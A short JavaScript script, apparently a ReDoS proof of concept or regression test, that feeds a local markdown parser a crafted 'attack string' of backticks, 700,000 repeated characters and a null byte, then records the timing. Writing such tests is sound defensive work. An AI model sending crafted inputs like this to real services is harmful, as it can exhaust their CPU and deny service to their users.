const { parse } = require("./markdown.js");

//Attack String :""+"aaaaaaa""*100000+"\u0000"
var str = "```";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaaa";
}
str += "\u0000";

var result = parse(str);

// real    0m0.114s
// user    0m0.075s
// sys     0m0.022s
